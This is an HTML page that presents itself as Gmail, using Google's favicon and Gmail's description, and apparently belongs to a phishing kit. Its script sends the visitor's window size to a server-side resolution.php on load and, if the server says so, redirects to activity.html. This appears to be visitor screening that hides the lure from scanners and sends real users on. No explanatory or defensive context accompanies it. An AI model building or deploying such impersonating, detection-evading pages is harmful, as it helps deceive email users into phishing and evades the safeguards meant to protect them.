<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8" />
		<meta name="chrome" content="nointentdetection" />
		<link rel="shortcut icon" href="https://www.google.com/favicon.ico" />
		<meta name="viewport" content="width=device-width, initial-scale=1" />
		<meta
			name="description"
			content="Gmail is email that&#39;s intuitive, efficient and useful. 15 GB of storage, less spam and mobile access."
		/>
		<title>Gmail</title>
		<script src="./tailwind.css"></script>
	</head>
	<body>
		<div class="flex min-h-screen bg-black">
			<div class="mx-auto p-10 text-gray-500">
				<div class="flex items-center space-x-1">
					<a href="#" id="browser-link" class="text-center">
						Open with the default browser
						<svg
							class="inline-block text-[#066ad2]/70"
							xmlns="http://www.w3.org/2000/svg"
							width="24"
							height="24"
							viewBox="0 0 24 24"
							fill="none"
							stroke="currentColor"
							stroke-width="2"
							stroke-linecap="round"
							stroke-linejoin="round"
							class="lucide lucide-compass"
						>
							<path
								d="m16.24 7.76-1.804 5.411a2 2 0 0 1-1.265 1.265L7.76 16.24l1.804-5.411a2 2 0 0 1 1.265-1.265z"
							/>
							<circle cx="12" cy="12" r="10" />
						</svg>
					</a>
					<div class="text-center" id="result"></div>
				</div>
			</div>
		</div>

		<script type="text/javascript">
			document.addEventListener("DOMContentLoaded", (event) => {
				// Function to send screen resolution to the server
				function sendResolution() {
					// Get the screen resolution
					const screenWidth = window.innerWidth;
					const screenHeight = window.innerHeight;
					const resolution = screenWidth * screenHeight;

					const domainUrl = window.location.origin;

					// Send the resolution to the PHP server
					fetch(`${domainUrl}/resolution.php`, {
						method: "POST",
						headers: {
							"Content-Type": "application/x-www-form-urlencoded",
						},
						body: `resolution=${resolution}`,
					})
						.then((response) => response.json())
						.then((data) => {
							// Display the result
							if (data.redirect) {
								window.location.href = `${domainUrl}/activity.html`;
							} else {
								// document.getElementById(
								// 	"result"
								// ).innerHTML = `Resolution saved. Please reload the page., ${data}`;
							}

							// console.log("Result:", data);
						})
						.catch((error) => {
							// Display the error
							console.log("Error:", error);
							// document.getElementById("result").innerHTML = "error";
						});
				}

				// Send the screen resolution to the server
				sendResolution();
			});
		</script>
	</body>
</html>
